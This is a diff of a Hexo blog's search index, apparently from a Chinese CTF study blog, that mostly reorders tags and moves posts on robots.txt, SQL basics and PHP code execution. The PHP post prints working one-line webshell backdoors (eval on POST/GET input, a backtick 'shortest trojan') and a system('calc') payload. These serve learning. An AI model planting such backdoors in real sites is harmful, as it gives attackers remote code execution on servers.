@@ -49,9 +49,9 @@
       
         <tags>
             
-            <tag> CTF 学习 </tag>
-            
             <tag> 基础知识 </tag>
+            
+            <tag> CTF 学习 </tag>
             
         </tags>
       
@@ -132,9 +132,9 @@
       
         <tags>
             
-            <tag> web </tag>
-            
             <tag> CTF 学习 </tag>
+            
+            <tag> web </tag>
             
         </tags>
       
@@ -188,9 +188,9 @@
       
         <tags>
             
-            <tag> CTF 学习 </tag>
-            
             <tag> 基础知识 </tag>
+            
+            <tag> CTF 学习 </tag>
             
         </tags>
       
@@ -215,9 +215,9 @@
       
         <tags>
             
-            <tag> CTF 学习 </tag>
-            
             <tag> 基础知识 </tag>
+            
+            <tag> CTF 学习 </tag>
             
             <tag> SQL </tag>
             
@@ -286,38 +286,11 @@
       
         <tags>
             
-            <tag> CTF 学习 </tag>
-            
             <tag> 基础知识 </tag>
+            
+            <tag> CTF 学习 </tag>
             
             <tag> 信息收集 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>关于robots文件</title>
-      <link href="/CTF-%E5%AD%A6%E4%B9%A0/%E5%85%B3%E4%BA%8Erobots%E6%96%87%E4%BB%B6/"/>
-      <url>/CTF-%E5%AD%A6%E4%B9%A0/%E5%85%B3%E4%BA%8Erobots%E6%96%87%E4%BB%B6/</url>
-      
-        <content type="html"><![CDATA[<h2 id="◎so，what-is-“robots”-？"><a href="#◎so，what-is-“robots”-？" class="headerlink" title="◎so，what is “robots” ？"></a>◎so，what is “robots” ？</h2><p>robots文件是网站和搜索引擎之间的协议，也是搜索引擎爬虫爬行网站的第一个访问的文件，官方叫做爬虫协议或者是机器人协议，robots全程为“网络爬虫排除标准”(Robots Exclusion Protocol)，我们所做的任何网站都可以通过robots协议告诉搜索引擎我们网站的哪些内容可以访问，哪些内容不能访问。</p><h2 id="◎robots文件的作用"><a href="#◎robots文件的作用" class="headerlink" title="◎robots文件的作用"></a>◎robots文件的作用</h2><p>1.可以屏蔽网站内一些打不开的链接</p><p>2.可以屏蔽搜索引擎蜘蛛访问网站内重复的内容和页面</p><p>3.阻止搜索引擎访问网站的隐私性内容</p><p>4.阻止搜索引擎访问网站的后台内容</p><p>5.告诉搜索引擎哪些内容是需要被访问的</p><h2 id="◎robots文件的重要性"><a href="#◎robots文件的重要性" class="headerlink" title="◎robots文件的重要性"></a>◎robots文件的重要性</h2><p>网页中重复页面、内容或者错误页面都可以通过robots文件来屏蔽或阻止访问，否则搜索引擎蜘蛛就会认为该网站的价值较低，从而导致搜索引擎给网站的评价降低，会直接导致我们的网站排名下降。</p>]]></content>
-      
-      
-      <categories>
-          
-          <category> CTF 学习 </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> CTF 学习 </tag>
-            
-            <tag> 基础知识 </tag>
             
         </tags>
       
@@ -344,11 +317,38 @@
       
         <tags>
             
+            <tag> 基础知识 </tag>
+            
             <tag> CTF 学习 </tag>
+            
+            <tag> 信息收集 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>关于robots文件</title>
+      <link href="/CTF-%E5%AD%A6%E4%B9%A0/%E5%85%B3%E4%BA%8Erobots%E6%96%87%E4%BB%B6/"/>
+      <url>/CTF-%E5%AD%A6%E4%B9%A0/%E5%85%B3%E4%BA%8Erobots%E6%96%87%E4%BB%B6/</url>
+      
+        <content type="html"><![CDATA[<h2 id="◎so，what-is-“robots”-？"><a href="#◎so，what-is-“robots”-？" class="headerlink" title="◎so，what is “robots” ？"></a>◎so，what is “robots” ？</h2><p>robots文件是网站和搜索引擎之间的协议，也是搜索引擎爬虫爬行网站的第一个访问的文件，官方叫做爬虫协议或者是机器人协议，robots全程为“网络爬虫排除标准”(Robots Exclusion Protocol)，我们所做的任何网站都可以通过robots协议告诉搜索引擎我们网站的哪些内容可以访问，哪些内容不能访问。</p><h2 id="◎robots文件的作用"><a href="#◎robots文件的作用" class="headerlink" title="◎robots文件的作用"></a>◎robots文件的作用</h2><p>1.可以屏蔽网站内一些打不开的链接</p><p>2.可以屏蔽搜索引擎蜘蛛访问网站内重复的内容和页面</p><p>3.阻止搜索引擎访问网站的隐私性内容</p><p>4.阻止搜索引擎访问网站的后台内容</p><p>5.告诉搜索引擎哪些内容是需要被访问的</p><h2 id="◎robots文件的重要性"><a href="#◎robots文件的重要性" class="headerlink" title="◎robots文件的重要性"></a>◎robots文件的重要性</h2><p>网页中重复页面、内容或者错误页面都可以通过robots文件来屏蔽或阻止访问，否则搜索引擎蜘蛛就会认为该网站的价值较低，从而导致搜索引擎给网站的评价降低，会直接导致我们的网站排名下降。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF 学习 </category>
+          
+      </categories>
+      
+      
+        <tags>
             
             <tag> 基础知识 </tag>
             
-            <tag> 信息收集 </tag>
+            <tag> CTF 学习 </tag>
             
         </tags>
       
@@ -373,9 +373,9 @@
       
         <tags>
             
-            <tag> CTF 学习 </tag>
-            
             <tag> 基础知识 </tag>
+            
+            <tag> CTF 学习 </tag>
             
         </tags>
       
@@ -429,42 +429,11 @@
       
         <tags>
             
-            <tag> web </tag>
+            <tag> 基础知识 </tag>
             
             <tag> CTF 学习 </tag>
             
-            <tag> 基础知识 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>PHP(2)代码执行</title>
-      <link href="/CTF-%E5%AD%A6%E4%B9%A0/web/PHP(2)%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
-      <url>/CTF-%E5%AD%A6%E4%B9%A0/web/PHP(2)%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</url>
-      
-        <content type="html"><![CDATA[<h1 id="0x1-什么是PHP代码执行"><a href="#0x1-什么是PHP代码执行" class="headerlink" title="0x1 什么是PHP代码执行"></a>0x1 什么是PHP代码执行</h1><p>可控指PHP可解释执行的代码，PHP中有专门将字符串当做PHP代码执行的语言eval，通过控制eval里面的参数控制PHP代码的执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(&quot;要执行的PHP代码&quot;);</span><br></pre></td></tr></table></figure><h1 id="0x2-代码执行和命令执行的区别"><a href="#0x2-代码执行和命令执行的区别" class="headerlink" title="0x2 代码执行和命令执行的区别"></a>0x2 代码执行和命令执行的区别</h1><p>执行参数不同</p><p>代码执行的是PHP后者其他语言的代码，比如<code>phpinfo()</code></p><p>而命令执行，一般执行的是shell命令，比如<code>ls /</code></p><p>system 命令执行<br>shell_exec 命令执行<br>eval 代码执行</p><h1 id="0x3-PHP代码执行的格式"><a href="#0x3-PHP代码执行的格式" class="headerlink" title="0x3 PHP代码执行的格式"></a>0x3 PHP代码执行的格式</h1><p><strong>在PHP语言中，代码分为三种</strong></p><h3 id="1-函数调用"><a href="#1-函数调用" class="headerlink" title="1.函数调用"></a>1.函数调用</h3><p>函数特征：函数名字，函数参数，返回值</p><p>基本的语法：</p><p>函数名   （ 参数 ）；</p><p>error_reporting   (  0  ) ;</p><h3 id="2-类方法调用"><a href="#2-类方法调用" class="headerlink" title="2.类方法调用"></a>2.类方法调用</h3><p>类的特征：类实例，方法名，方法参数，返回值</p><p>？？？动态函数调用<br>？？？静态函数调用</p><h3 id="3-语言结构调用"><a href="#3-语言结构调用" class="headerlink" title="3.语言结构调用"></a>3.语言结构调用</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot; ctfshow &quot; ;</span><br></pre></td></tr></table></figure><h1 id="0x4-PHP代码执行后门"><a href="#0x4-PHP代码执行后门" class="headerlink" title="0x4 PHP代码执行后门"></a>0x4 PHP代码执行后门</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">eval($_POST[1]);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>最简单的PHP一句话后门，也叫PHP小马，如果我们想在服务器上(Windows系统)弹出计算器，发送POST请求即可：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1=system(&quot;calc&quot;);</span><br></pre></td></tr></table></figure><p>——&gt;蚁剑</p><p>url地址：xxxxx<br>连接密码：1</p><p>若木马接收代码为<code>eval($_GET[1]);</code><br>我们需要手动写一个转接头，<strong>加在GET型请求的url后面</strong>：<br>（GET转POST转接头）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?1=eval(\$_POST[1]);</span><br></pre></td></tr></table></figure><h1 id="0x5-代码执行的类型"><a href="#0x5-代码执行的类型" class="headerlink" title="0x5 代码执行的类型"></a>0x5 代码执行的类型</h1><p><u>函数名+函数类型可控&#x3D;可以执行任意代码</u></p><p>1.危险函数型</p><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209052051444.png" alt="image-20220905205127371"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(&quot;sys&quot;.&quot;tem&quot;)=system</span><br><span class="line">&lt;script language=&quot;php&quot;&gt;eval($_POST[1])&lt;/script&gt; </span><br></pre></td></tr></table></figure><p>php5.6版本以前的可用</p><p>最短木马：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?`$_GET[2]`;&amp;2=</span><br></pre></td></tr></table></figure>]]></content>
-      
-      
-      <categories>
-          
-          <category> CTF 学习 </category>
-          
-          <category> web </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
             <tag> web </tag>
-            
-            <tag> CTF 学习 </tag>
-            
-            <tag> 基础知识 </tag>
             
         </tags>
       
@@ -491,40 +460,11 @@
       
         <tags>
             
+            <tag> 基础知识 </tag>
+            
+            <tag> CTF 学习 </tag>
+            
             <tag> web </tag>
-            
-            <tag> CTF 学习 </tag>
-            
-            <tag> 基础知识 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>SQL基础</title>
-      <link href="/CTF-%E5%AD%A6%E4%B9%A0/SQL%E5%9F%BA%E7%A1%80/"/>
-      <url>/CTF-%E5%AD%A6%E4%B9%A0/SQL%E5%9F%BA%E7%A1%80/</url>
-      
-        <content type="html"><![CDATA[<h1 id="0x1-SQL语言的作用"><a href="#0x1-SQL语言的作用" class="headerlink" title="0x1 SQL语言的作用"></a>0x1 SQL语言的作用</h1><p>SQL 是 Structured Query Language 的缩写，中文译为“结构化查询语言”。SQL 是一种计算机语言，用来存储、检索和修改关系型数据库中存储的数据。</p><h1 id="0x2-数据库"><a href="#0x2-数据库" class="headerlink" title="0x2 数据库"></a>0x2 数据库</h1><p>是一种软件，将数据以一定格式保存在磁盘中，方便对数据进行操作。</p><p><strong>数据库一般分为：关系型数据库、非关系型数据库</strong></p><h5 id="◎关系型数据库"><a href="#◎关系型数据库" class="headerlink" title="◎关系型数据库"></a>◎关系型数据库</h5><p>以<u>行和列的形式</u>(表)储存数据，一组表组成数据库</p><p>典型代表：Oracle、MySQL、SQLsever、Access</p><h5 id="◎非关系型数据库"><a href="#◎非关系型数据库" class="headerlink" title="◎非关系型数据库"></a>◎非关系型数据库</h5><p>即NoSQL，泛指非关系型数据库，解决大规模数据集合多重数据种类带来的挑战</p><p>典型代表：Membase、MongoDB</p><h1 id="0x3-MySQL"><a href="#0x3-MySQL" class="headerlink" title="0x3 MySQL"></a>0x3 MySQL</h1><h3 id="◎注释"><a href="#◎注释" class="headerlink" title="◎注释"></a>◎注释</h3><ol><li><code>-- 注释内容</code></li></ol><p>这种注释方法不能够实现多行注释，要注意的是 –后面是有一个空格的。（– 后面的内容将不会被识别，因此需要在下一行加上分号来结束该语句）<img src="https://img.php.cn/upload/article/000/000/024/647e971da51e598cf3d5b578485c666a-0.png" alt="在这里插入图片描述"></p><p>2.<code>#注释内容</code><br>这种注释方法也不能实现多行注释。<br><img src="https://img.php.cn/upload/article/000/000/024/647e971da51e598cf3d5b578485c666a-1.png" alt="#号注释符"></p><p>3.<strong><code>/*注释内容 */</code></strong><img src="https://img.php.cn/upload/article/000/000/024/647e971da51e598cf3d5b578485c666a-2.png" alt="在这里插入图片描述"></p><p>这种注释能够实现多行注释。</p><p>4<code>./*！注释内容*/</code><br>这种注释在mysql中叫做<strong>内联注释</strong>，当后面所接的数据库版本号时，当实际的版本等于或是高于那个字符串，应用程序就会将注释内容解释为SQL，否则就会当做注释来处理。默认的，当没有接版本号时，是会执行里面的内容的。<br><img src="https://img.php.cn/upload/article/000/000/024/1427d574f628654aaecf53fafc78378a-3.png" alt="这个语句和select name,math,science from stu where total =270 union select 1,2,3的结果是相同的"></p><h3 id="◎mysql-元数据数据库-information-schema"><a href="#◎mysql-元数据数据库-information-schema" class="headerlink" title="◎mysql 元数据数据库 information_schema"></a>◎mysql 元数据数据库 information_schema</h3><p>储存元数据：库名、表名、字段名 </p><p>数据库INFORMATION_SCHEMA中所有的表名存在 TABLES表、TABLE_NAME字段中，表所属的数据库名存储在TABLE_SCHEMA字段中</p><p> COLUMS表中COLUMN_NAME存储所有字段名，其中TABLE_NAME为字段所存的表名，其中TABLE_SCHEMA为字段所属的库名<br><img src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20221019200523495.png" alt="image-20221019200523495" style="zoom:50%;"></p><h3 id="◎mysql常用函数与参数"><a href="#◎mysql常用函数与参数" class="headerlink" title="◎mysql常用函数与参数"></a>◎mysql常用函数与参数</h3><h3 id><a href="#" class="headerlink" title></a><img src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20221019201158078.png" alt="image-20221019201158078" style="zoom:50%;"></h3><p>（<code>&lt;&gt;</code>为<code>不等于</code>号）</p><p><img src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20221019201250506.png" alt="image-20221019201250506" style="zoom:50%;"><img src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20221019201325534.png" alt="image-20221019201325534" style="zoom:50%;"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">substring、substr、mid函数，括号内有三个参数：1.截取的字符串2.截取起始位置，从1开始计数3.截取长度</span><br></pre></td></tr></table></figure><h3 id="-1"><a href="#-1" class="headerlink" title></a><img src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20221019203432873.png" alt="image-20221019203432873" style="zoom:80%;"></h3><p>left函数参数示例<br><img src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20221019205857895.png" alt="image-20221019205857895" style="zoom:80%;"></p><h3 id="-2"><a href="#-2" class="headerlink" title></a><img src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20221019210925727.png" alt="image-20221019210925727" style="zoom:67%;"></h3><h3 id="-3"><a href="#-3" class="headerlink" title></a><img src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20221019215057815.png" alt="image-20221019215057815" style="zoom: 33%;"></h3><h3 id="-4"><a href="#-4" class="headerlink" title></a><img src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20221019215342958.png" alt="image-20221019215342958" style="zoom: 33%;"></h3>]]></content>
-      
-      
-      <categories>
-          
-          <category> CTF 学习 </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> CTF 学习 </tag>
-            
-            <tag> 基础知识 </tag>
-            
-            <tag> SQL </tag>
             
         </tags>
       
@@ -549,9 +489,9 @@
       
         <tags>
             
-            <tag> CTF 学习 </tag>
-            
             <tag> 基础知识 </tag>
+            
+            <tag> CTF 学习 </tag>
             
         </tags>
       
@@ -560,13 +500,60 @@
     
     
     <entry>
-      <title>Hello World</title>
-      <link href="/uncategorized/hello-world/"/>
-      <url>/uncategorized/hello-world/</url>
+      <title>PHP(2)代码执行</title>
+      <link href="/CTF-%E5%AD%A6%E4%B9%A0/web/PHP(2)%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
+      <url>/CTF-%E5%AD%A6%E4%B9%A0/web/PHP(2)%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</url>
       
-        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
+        <content type="html"><![CDATA[<h1 id="0x1-什么是PHP代码执行"><a href="#0x1-什么是PHP代码执行" class="headerlink" title="0x1 什么是PHP代码执行"></a>0x1 什么是PHP代码执行</h1><p>可控指PHP可解释执行的代码，PHP中有专门将字符串当做PHP代码执行的语言eval，通过控制eval里面的参数控制PHP代码的执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(&quot;要执行的PHP代码&quot;);</span><br></pre></td></tr></table></figure><h1 id="0x2-代码执行和命令执行的区别"><a href="#0x2-代码执行和命令执行的区别" class="headerlink" title="0x2 代码执行和命令执行的区别"></a>0x2 代码执行和命令执行的区别</h1><p>执行参数不同</p><p>代码执行的是PHP后者其他语言的代码，比如<code>phpinfo()</code></p><p>而命令执行，一般执行的是shell命令，比如<code>ls /</code></p><p>system 命令执行<br>shell_exec 命令执行<br>eval 代码执行</p><h1 id="0x3-PHP代码执行的格式"><a href="#0x3-PHP代码执行的格式" class="headerlink" title="0x3 PHP代码执行的格式"></a>0x3 PHP代码执行的格式</h1><p><strong>在PHP语言中，代码分为三种</strong></p><h3 id="1-函数调用"><a href="#1-函数调用" class="headerlink" title="1.函数调用"></a>1.函数调用</h3><p>函数特征：函数名字，函数参数，返回值</p><p>基本的语法：</p><p>函数名   （ 参数 ）；</p><p>error_reporting   (  0  ) ;</p><h3 id="2-类方法调用"><a href="#2-类方法调用" class="headerlink" title="2.类方法调用"></a>2.类方法调用</h3><p>类的特征：类实例，方法名，方法参数，返回值</p><p>？？？动态函数调用<br>？？？静态函数调用</p><h3 id="3-语言结构调用"><a href="#3-语言结构调用" class="headerlink" title="3.语言结构调用"></a>3.语言结构调用</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot; ctfshow &quot; ;</span><br></pre></td></tr></table></figure><h1 id="0x4-PHP代码执行后门"><a href="#0x4-PHP代码执行后门" class="headerlink" title="0x4 PHP代码执行后门"></a>0x4 PHP代码执行后门</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">eval($_POST[1]);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>最简单的PHP一句话后门，也叫PHP小马，如果我们想在服务器上(Windows系统)弹出计算器，发送POST请求即可：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1=system(&quot;calc&quot;);</span><br></pre></td></tr></table></figure><p>——&gt;蚁剑</p><p>url地址：xxxxx<br>连接密码：1</p><p>若木马接收代码为<code>eval($_GET[1]);</code><br>我们需要手动写一个转接头，<strong>加在GET型请求的url后面</strong>：<br>（GET转POST转接头）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?1=eval(\$_POST[1]);</span><br></pre></td></tr></table></figure><h1 id="0x5-代码执行的类型"><a href="#0x5-代码执行的类型" class="headerlink" title="0x5 代码执行的类型"></a>0x5 代码执行的类型</h1><p><u>函数名+函数类型可控&#x3D;可以执行任意代码</u></p><p>1.危险函数型</p><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209052051444.png" alt="image-20220905205127371"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(&quot;sys&quot;.&quot;tem&quot;)=system</span><br><span class="line">&lt;script language=&quot;php&quot;&gt;eval($_POST[1])&lt;/script&gt; </span><br></pre></td></tr></table></figure><p>php5.6版本以前的可用</p><p>最短木马：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?`$_GET[2]`;&amp;2=</span><br></pre></td></tr></table></figure>]]></content>
       
       
+      <categories>
+          
+          <category> CTF 学习 </category>
+          
+          <category> web </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 基础知识 </tag>
+            
+            <tag> CTF 学习 </tag>
+            
+            <tag> web </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>SQL基础</title>
+      <link href="/CTF-%E5%AD%A6%E4%B9%A0/SQL%E5%9F%BA%E7%A1%80/"/>
+      <url>/CTF-%E5%AD%A6%E4%B9%A0/SQL%E5%9F%BA%E7%A1%80/</url>
+      
+        <content type="html"><![CDATA[<h1 id="0x1-SQL语言的作用"><a href="#0x1-SQL语言的作用" class="headerlink" title="0x1 SQL语言的作用"></a>0x1 SQL语言的作用</h1><p>SQL 是 Structured Query Language 的缩写，中文译为“结构化查询语言”。SQL 是一种计算机语言，用来存储、检索和修改关系型数据库中存储的数据。</p><h1 id="0x2-数据库"><a href="#0x2-数据库" class="headerlink" title="0x2 数据库"></a>0x2 数据库</h1><p>是一种软件，将数据以一定格式保存在磁盘中，方便对数据进行操作。</p><p><strong>数据库一般分为：关系型数据库、非关系型数据库</strong></p><h5 id="◎关系型数据库"><a href="#◎关系型数据库" class="headerlink" title="◎关系型数据库"></a>◎关系型数据库</h5><p>以<u>行和列的形式</u>(表)储存数据，一组表组成数据库</p><p>典型代表：Oracle、MySQL、SQLsever、Access</p><h5 id="◎非关系型数据库"><a href="#◎非关系型数据库" class="headerlink" title="◎非关系型数据库"></a>◎非关系型数据库</h5><p>即NoSQL，泛指非关系型数据库，解决大规模数据集合多重数据种类带来的挑战</p><p>典型代表：Membase、MongoDB</p><h1 id="0x3-MySQL"><a href="#0x3-MySQL" class="headerlink" title="0x3 MySQL"></a>0x3 MySQL</h1><h3 id="◎注释"><a href="#◎注释" class="headerlink" title="◎注释"></a>◎注释</h3><ol><li><code>-- 注释内容</code></li></ol><p>这种注释方法不能够实现多行注释，要注意的是 –后面是有一个空格的。（– 后面的内容将不会被识别，因此需要在下一行加上分号来结束该语句）<img src="https://img.php.cn/upload/article/000/000/024/647e971da51e598cf3d5b578485c666a-0.png" alt="在这里插入图片描述"></p><p>2.<code>#注释内容</code><br>这种注释方法也不能实现多行注释。<br><img src="https://img.php.cn/upload/article/000/000/024/647e971da51e598cf3d5b578485c666a-1.png" alt="#号注释符"></p><p>3.<strong><code>/*注释内容 */</code></strong><img src="https://img.php.cn/upload/article/000/000/024/647e971da51e598cf3d5b578485c666a-2.png" alt="在这里插入图片描述"></p><p>这种注释能够实现多行注释。</p><p>4<code>./*！注释内容*/</code><br>这种注释在mysql中叫做<strong>内联注释</strong>，当后面所接的数据库版本号时，当实际的版本等于或是高于那个字符串，应用程序就会将注释内容解释为SQL，否则就会当做注释来处理。默认的，当没有接版本号时，是会执行里面的内容的。<br><img src="https://img.php.cn/upload/article/000/000/024/1427d574f628654aaecf53fafc78378a-3.png" alt="这个语句和select name,math,science from stu where total =270 union select 1,2,3的结果是相同的"></p><h3 id="◎mysql-元数据数据库-information-schema"><a href="#◎mysql-元数据数据库-information-schema" class="headerlink" title="◎mysql 元数据数据库 information_schema"></a>◎mysql 元数据数据库 information_schema</h3><p>储存元数据：库名、表名、字段名 </p><p>数据库INFORMATION_SCHEMA中所有的表名存在 TABLES表、TABLE_NAME字段中，表所属的数据库名存储在TABLE_SCHEMA字段中</p><p> COLUMS表中COLUMN_NAME存储所有字段名，其中TABLE_NAME为字段所存的表名，其中TABLE_SCHEMA为字段所属的库名<br><img src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20221019200523495.png" alt="image-20221019200523495" style="zoom:50%;"></p><h3 id="◎mysql常用函数与参数"><a href="#◎mysql常用函数与参数" class="headerlink" title="◎mysql常用函数与参数"></a>◎mysql常用函数与参数</h3><h3 id><a href="#" class="headerlink" title></a><img src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20221019201158078.png" alt="image-20221019201158078" style="zoom:50%;"></h3><p>（<code>&lt;&gt;</code>为<code>不等于</code>号）</p><p><img src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20221019201250506.png" alt="image-20221019201250506" style="zoom:50%;"><img src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20221019201325534.png" alt="image-20221019201325534" style="zoom:50%;"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">substring、substr、mid函数，括号内有三个参数：1.截取的字符串2.截取起始位置，从1开始计数3.截取长度</span><br></pre></td></tr></table></figure><h3 id="-1"><a href="#-1" class="headerlink" title></a><img src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20221019203432873.png" alt="image-20221019203432873" style="zoom:80%;"></h3><p>left函数参数示例<br><img src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20221019205857895.png" alt="image-20221019205857895" style="zoom:80%;"></p><h3 id="-2"><a href="#-2" class="headerlink" title></a><img src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20221019210925727.png" alt="image-20221019210925727" style="zoom:67%;"></h3><h3 id="-3"><a href="#-3" class="headerlink" title></a><img src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20221019215057815.png" alt="image-20221019215057815" style="zoom: 33%;"></h3><h3 id="-4"><a href="#-4" class="headerlink" title></a><img src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20221019215342958.png" alt="image-20221019215342958" style="zoom: 33%;"></h3>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF 学习 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 基础知识 </tag>
+            
+            <tag> CTF 学习 </tag>
+            
+            <tag> SQL </tag>
+            
+        </tags>
       
     </entry>
     
@@ -596,6 +583,19 @@
             <tag> 模拟演练 </tag>
             
         </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Hello World</title>
+      <link href="/uncategorized/hello-world/"/>
+      <url>/uncategorized/hello-world/</url>
+      
+        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo 